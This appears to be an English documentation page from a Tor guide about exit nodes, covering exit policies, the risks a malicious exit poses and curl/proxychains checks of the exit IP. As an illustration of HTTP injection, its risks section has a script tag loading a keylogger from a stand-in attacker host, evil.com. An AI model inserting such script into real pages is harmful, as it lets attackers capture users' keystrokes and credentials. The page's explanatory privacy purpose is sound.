> **Lingua / Language**: [Italiano](../../03-nodi-e-rete/exit-nodes.md) | English

# Exit Nodes - The Last Hop and the Point of Maximum Risk

This document provides an in-depth analysis of Tor Exit Nodes: their role in the
circuit, exit policies, security risks (sniffing, injection, MITM), how to verify
the exit IP, and the implications for exit operators.

It includes observations from my experience in verifying exit IPs, dealing with
blocks and CAPTCHAs, and understanding why certain sites do not work via Tor.

---
---

## Table of Contents

- [Role of the Exit Node](#role-of-the-exit-node)
- [Exit Policy - The exit rules](#exit-policy-the-exit-rules)
- [Exit Node specific risks](#exit-node-specific-risks)
- [Verifying the Exit Node IP](#verifying-the-exit-node-ip)
**Deep dives** (dedicated files):
- [Exit Nodes in Practice](exit-nodes-pratica.md) - Blocks/CAPTCHAs, DNS, selectivity, identification


## Role of the Exit Node

The Exit Node is the **last node** in the Tor circuit:

```
[You] ──► [Guard] ──► [Middle] ──► [Exit Node] ──TCP──► [Internet]
```

The Exit is the point where traffic **leaves the Tor network** and reaches the
final destination as normal TCP traffic.

### What the Exit Node knows

| Information | Visible to the Exit? |
|-------------|---------------------|
| Your real IP | **NO** - only sees the Middle's IP |
| The destination (hostname + port) | **YES** - it opens the connection |
| Plaintext HTTP content | **YES** - if the site does not use HTTPS |
| HTTPS content | **NO** - only sees TLS-encrypted traffic |
| TLS metadata (SNI) | **YES** - the Server Name Indication is in cleartext in the ClientHello |
| DNS queries | **YES** - it resolves the hostnames |
| Request timing | **YES** - sees when each stream starts and ends |

### The critical point: the Exit sees plaintext traffic

This is the most important consequence of the Tor architecture:

```
With HTTPS:
Exit → sees → [TLS encrypted blob] → destination
              (cannot read the content)

Without HTTPS:
Exit → sees → [GET /login?user=mario&pass=123] → destination
              (READS EVERYTHING IN CLEARTEXT)
```

---

## Exit Policy - The exit rules

### What is an Exit Policy

Every Exit Node defines an **exit policy**: a set of rules that specify to which
addresses and ports the relay is willing to forward traffic.

Policies are evaluated in order, first-match-wins:

```
accept *:80       # Accept traffic to port 80 (HTTP) everywhere
accept *:443      # Accept traffic to port 443 (HTTPS) everywhere
reject *:*        # Reject everything else
```

### Typical policies

**Minimal exit (web only)**:
```
accept *:80
accept *:443
reject *:*
```

**Permissive exit (reduced default)**:
```
accept *:20-23     # FTP, SSH, Telnet
accept *:43        # WHOIS
accept *:53        # DNS
accept *:79-81     # Finger, HTTP
accept *:88        # Kerberos
accept *:110       # POP3
accept *:143       # IMAP
accept *:443       # HTTPS
accept *:993       # IMAPS
accept *:995       # POP3S
reject *:*
```

**Restrictive exit (no exit)**:
```
reject *:*
```
This relay is not an exit - it is only a middle/guard.

### Policies in the consensus

The consensus contains a compressed version of the exit policy for each relay:

```
p accept 80,443
p accept 20-23,43,53,79-81,110,143,443,993,995
p reject 1-65535
```

Tor uses these policies to select the correct exit for the requested destination.
If you want to reach port 22 (SSH), Tor selects only exits that accept port 22.

### In my experience

When I use `proxychains curl https://api.ipify.org`, Tor must select an exit
with a policy that accepts port 443. This is never a problem because the vast
majority of exits accept 443.

But when I tried `proxychains ssh user@server.com`, the connection often failed
because many exits do not accept port 22. In those cases, Tor builds circuits
and discards them until it finds a suitable exit - causing significant delays.

---

## Exit Node specific risks

### 1. Sniffing unencrypted traffic

A malicious exit performs passive analysis of transiting traffic:

```
HTTP traffic (unencrypted):
- Full URLs (e.g., http://example.com/api/login)
- HTTP Headers (Cookie, Authorization, User-Agent)
- POST request bodies (username, password, form data)
- Response content (HTML pages, JSON, files)

HTTPS traffic (TLS encrypted):
- SNI (Server Name Indication) - the domain in cleartext in the ClientHello
  (e.g., "api.ipify.org" is visible even with HTTPS)
- Approximate response size
- Request timing
```

**A malicious exit can**:
- Harvest plaintext HTTP credentials
- Profile traffic based on SNI and sizes
- Collect metadata (who visits what, when)

**It cannot**:
- Decrypt HTTPS traffic (does not have the server's private key)
- Trace back to your IP (only sees the Middle)

### 2. Active traffic manipulation

A malicious exit can modify unencrypted traffic:

**HTTP injection**: inject malicious JavaScript into HTTP pages:
```html
<!-- Original site page -->
<html>...</html>

<!-- The exit injects at the end: -->
<script src="http://evil.com/keylogger.js"></script>
```

**Download injection**: modify files downloaded via HTTP:
```
User downloads: http://example.com/software.exe
Exit replaces with: malware.exe (same size, same name)
```

**SSL stripping**: redirect from HTTPS to HTTP and then read in cleartext:
```
1. User requests: http://example.com (without S)
2. The server responds: 301 Redirect → https://example.com
3. The exit intercepts the redirect and removes it
4. The user continues using plaintext HTTP
5. The exit reads everything
```

**Mitigation**: HSTS (HTTP Strict Transport Security) prevents SSL stripping if
the browser has already visited the site over HTTPS. Tor Browser has a preloaded
HSTS list.

### 3. DNS attacks

The exit node resolves hostnames on behalf of the user. A malicious exit can:

- **DNS spoofing**: resolve `login.bank.com` to a phishing server
- **DNS logging**: log all domains requested by the user
- **Selective blocking**: refuse to resolve certain domains to force the user
  toward controlled alternatives

**Mitigation**: HTTPS with certificate validation. If `login.bank.com` is resolved
to a malicious IP, the TLS certificate will not match and the browser will display
an error.

### 4. Exit node as "Man in the Middle" on TLS

A malicious exit could attempt a MITM attack on HTTPS:

```
1. The user requests HTTPS to example.com
2. The exit connects to example.com and obtains the legitimate certificate
3. The exit generates a fake certificate for example.com
4. The exit presents it to the user

But: the fake certificate is not signed by a trusted CA
→ The browser displays a certificate error
→ The attack fails if the user does not ignore the error
```

**Protection**: never ignore certificate errors when on Tor. Tor Browser displays
prominent warnings in these cases.

---

## Verifying the Exit Node IP

### Method 1: curl via SOCKS5

```bash
> curl --socks5-hostname 127.0.0.1:9050 https://api.ipify.org
185.220.101.143
```

This shows the current Exit Node's IP. This IP is what websites see.

### Method 2: proxychains curl

```bash
> proxychains curl https://api.ipify.org
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  api.ipify.org:443  ...  OK
185.220.101.143
```

### Method 3: Detailed information

```bash
> proxychains curl -s https://ipinfo.io
{
  "ip": "185.220.101.143",
  "city": "Amsterdam",
  "region": "North Holland",
  "country": "NL",
  "org": "AS60729 Stichting Tor Exit",
  "timezone": "Europe/Amsterdam"
}
```

The organization (`org`) often contains "Tor Exit" in the name, because many exits
are operated by dedicated organizations.

### Method 4: Verify whether the IP is a known Tor exit

```bash
> proxychains curl -s https://check.torproject.org/api/ip
{"IsTor":true,"IP":"185.220.101.143"}
```

`IsTor: true` confirms that the IP is a known Tor exit node.

### In my experience

After each NEWNYM, I verify that the IP has changed:

```bash
> proxychains curl -s https://api.ipify.org
185.220.101.143

> ~/scripts/newnym
250 OK
250 closing connection

> proxychains curl -s https://api.ipify.org
104.244.76.13         # Different IP → new circuit, new exit

> proxychains curl -s https://ipinfo.io | grep org
"org": "AS53667 FranTech Solutions"
```

Not all exits have "Tor" in the organization name. Some are normal VPS instances
whose operator decided to run an exit node.

---

> **Continues in**: [Exit Nodes in Practice](exit-nodes-pratica.md) for blocks/CAPTCHAs,
> DNS, selective exit policies, and identifying exits in the consensus.

---

## See also

- [Exit Nodes in Practice](exit-nodes-pratica.md) - Blocks, DNS, selectivity, identification
- [Guard Nodes](guard-nodes.md) - First hop of the circuit
- [Middle Relay](middle-relay.md) - Second hop of the circuit
- [Legal Aspects](../08-aspetti-legali-ed-etici/aspetti-legali.md) - Legality of operating an exit node
- [Real-World Scenarios](scenari-reali.md) - Practical operational cases from a pentester
